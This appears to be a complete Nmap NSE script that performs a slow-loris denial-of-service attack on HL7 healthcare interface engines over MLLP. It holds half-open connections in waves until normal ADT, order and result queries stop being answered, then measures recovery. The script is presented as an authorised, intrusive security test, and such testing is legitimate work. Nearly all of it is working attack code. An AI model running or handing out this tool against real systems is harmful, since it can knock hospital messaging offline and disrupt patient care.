local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"
local string = require "string"
local math = require "math"
local hl7 = require "hl7"

description = [[
Tests an HL7 v2 interface engine for MLLP connection-exhaustion (a slow-loris
style denial of service).

MLLP delimits a message with a start block (VT, 0x0B) and an end block
(FS 0x1C, CR 0x0D). A receiver reads from the socket until it sees the end
block, so a client that sends the start block and part of a message but never
the end block holds a receiver connection (and often a worker thread) open
indefinitely. Enough such half-open connections exhaust the engine's connection
or thread pool and block legitimate ADT, order and result traffic - with almost
no bandwidth from the attacker.

The script opens connections in waves, keeps each one half-open, and between
waves probes the engine with a normal query. When a well-formed probe stops
being answered, the pool is exhausted. It then releases the connections and
measures how long the engine takes to recover.

Modes:
  1. "partial" (default) - send the start block plus a partial message with no
     end block, so the receiver keeps waiting for the terminator.
  2. "idle" - open the TCP connection and send nothing.
  3. "trickle" - like partial, but dribble one extra byte per hold interval to
     defeat idle read timeouts while still never completing the message.

This is an INTRUSIVE denial-of-service test. It can take an interface engine
offline. Only run it against systems you are authorised to test, ideally in a
lab or a maintenance window.
]]

---
-- @usage nmap -p2575 --script hl7-slowloris <target>
-- @usage
-- nmap -p2575 --script hl7-slowloris --script-args
--   hl7-slowloris.connections=200,hl7-slowloris.mode=partial <target>
--
-- @output
-- PORT     STATE SERVICE
-- 2575/tcp open  hl7
-- | hl7-slowloris:
-- |   Mode: partial
-- |   Phase 1 - Filling connection pool:
-- |     Wave 1: opened 10 half-open connections (10 total, 0 failed)
-- |     Exhaustion reached at 28 connections - probe failed
-- |   Phase 2 - Holding: held 28 connections for 10.0s
-- |   Phase 3 - Release and recovery:
-- |     Recovery probe: engine available 1.2s after release
-- |   Results:
-- |     VULNERABLE: MLLP connection-pool exhaustion confirmed
-- |_    ~28 half-open connections blocked all HL7 messaging
--
-- @args hl7-slowloris.connections   Max connections to open. Default: 50
-- @args hl7-slowloris.mode          "partial", "idle" or "trickle". Default:
--                                   partial
-- @args hl7-slowloris.wave_size     Connections per wave. Default: 10
-- @args hl7-slowloris.wave_delay    Seconds between waves. Default: 1
-- @args hl7-slowloris.hold_time     Seconds to hold after exhaustion. Default:
--                                   10
-- @args hl7-slowloris.partial_bytes Bytes of the partial message to send.
--                                   Default: 24
-- @args hl7-slowloris.timeout       Probe timeout in seconds. Default: 8
-- @args hl7-slowloris.tls           Set to "true" for MLLP over TLS. Default:
--                                   false
---

author = "Paulino Calderon <paulino@calderonpale.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

portrule = shortport.port_or_service({2575, 2576}, "hl7", "tcp", "open")

local function arg(name, default)
  return stdnse.get_script_args("hl7-slowloris." .. name) or default
end

--- Sleep for N seconds (NSE has no native sleep; block on a dummy receive).
local function sleep_s(seconds)
  local s = nmap.new_socket()
  s:set_timeout(math.floor(seconds * 1000))
  pcall(function() s:receive() end)
  s:close()
end

--- Probe the engine with a well-formed query; return ok, elapsed_ms.
local function probe(host, port, timeout_s, tls)
  local t0 = nmap.clock_ms()
  local msg = hl7.build_qry_a19("1", { processing_id = "T" })
  local ok, resp = hl7.transact(host, port, msg, timeout_s, tls)
  local ms = nmap.clock_ms() - t0
  if not ok then
    return false, ms
  end
  local info = hl7.parse_response(resp)
  return hl7.find_segment(info.segments, "MSH") ~= nil, ms
end

--- Open one half-open connection according to mode. Returns the socket or nil.
local function open_conn(host, port, mode, partial_bytes, timeout_s, tls)
  local sock = hl7.new_sock(timeout_s)
  local ok = hl7.connect(sock, host, port, tls)
  if not ok then
    sock:close()
    return nil
  end
  if mode ~= "idle" then
    -- Start block + a partial message, but never the end block.
    local partial = "MSH" .. hl7.ENCODING.FIELD
      .. hl7.ENCODING.COMPONENT .. hl7.ENCODING.REPEAT
      .. hl7.ENCODING.ESCAPE .. hl7.ENCODING.SUBCOMP
      .. hl7.ENCODING.FIELD .. "NMAP" .. hl7.ENCODING.FIELD
    partial = string.sub(partial, 1, math.max(partial_bytes, 1))
    sock:send(hl7.MLLP.VT .. partial)
  end
  return sock
end

action = function(host, port)
  local out = stdnse.output_table()
  local mode = arg("mode", "partial"):lower()
  local max_conns = tonumber(arg("connections", "50"))
  local wave_size = tonumber(arg("wave_size", "10"))
  local wave_delay = tonumber(arg("wave_delay", "1"))
  local hold_time = tonumber(arg("hold_time", "10"))
  local partial_bytes = tonumber(arg("partial_bytes", "24"))
  local timeout_s = tonumber(arg("timeout", "8"))
  local tls = arg("tls", "false") == "true"

  out["Mode"] = mode

  -- Confirm the engine answers before we start.
  local base_ok, base_ms = probe(host, port, timeout_s, tls)
  if not base_ok then
    out["Result"] = string.format(
      "Engine did not answer a baseline query (%.0f ms) - not testing",
      base_ms)
    return out
  end

  -- Phase 1: fill the connection pool in waves, probing between waves.
  local held = {}
  local failed = 0
  local exhausted = false
  local threshold = 0
  local fill_lines = {}

  local wave = 0
  while #held < max_conns and not exhausted do
    wave = wave + 1
    local opened = 0
    for _ = 1, wave_size do
      if #held >= max_conns then break end
      local s = open_conn(host, port, mode, partial_bytes, timeout_s, tls)
      if s then
        held[#held + 1] = s
        opened = opened + 1
      else
        failed = failed + 1
      end
    end
    fill_lines[#fill_lines + 1] = string.format(
      "Wave %d: opened %d half-open connections (%d total, %d failed)",
      wave, opened, #held, failed)

    local pok, pms = probe(host, port, timeout_s, tls)
    if not pok then
      exhausted = true
      threshold = #held
      fill_lines[#fill_lines + 1] = string.format(
        "Exhaustion reached at %d connections - probe failed (%.0f ms)",
        threshold, pms)
    end
    if not exhausted then sleep_s(wave_delay) end
  end
  out["Phase 1 - Filling connection pool"] = fill_lines

  -- Phase 2: hold.
  if exhausted then
    if mode == "trickle" then
      local elapsed = 0
      while elapsed < hold_time do
        for _, s in ipairs(held) do
          pcall(function() s:send(" ") end)
        end
        sleep_s(2)
        elapsed = elapsed + 2
      end
    else
      sleep_s(hold_time)
    end
    out["Phase 2 - Holding"] = string.format(
      "held %d connections for %.1fs", #held, hold_time)
  else
    out["Phase 2 - Holding"] = string.format(
      "Skipped - engine still answered after %d connections", #held)
  end

  -- Phase 3: release and measure recovery.
  for _, s in ipairs(held) do
    pcall(function() s:close() end)
  end
  local rec_lines = {}
  rec_lines[#rec_lines + 1] = string.format("Released %d connections", #held)
  local recovered_after = nil
  for attempt = 1, math.max(math.floor(30 / 2), 1) do
    sleep_s(2)
    local rok = probe(host, port, timeout_s, tls)
    if rok then
      recovered_after = attempt * 2
      break
    end
  end
  if recovered_after then
    rec_lines[#rec_lines + 1] = string.format(
      "Recovery probe: engine available ~%ds after release", recovered_after)
  else
    rec_lines[#rec_lines + 1] =
      "Engine still unavailable 30s after release"
  end
  out["Phase 3 - Release and recovery"] = rec_lines

  -- Verdict.
  if exhausted then
    out["Results"] = {
      "VULNERABLE: MLLP connection-pool exhaustion confirmed",
      string.format("~%d half-open connections blocked all HL7 messaging",
        threshold),
    }
    nmap.set_port_version(host, port, "hardmatched")
  else
    out["Results"] = {
      string.format("NOT confirmed: engine answered with %d connections held",
        #held),
      "Try raising hl7-slowloris.connections",
    }
  end
  return out
end
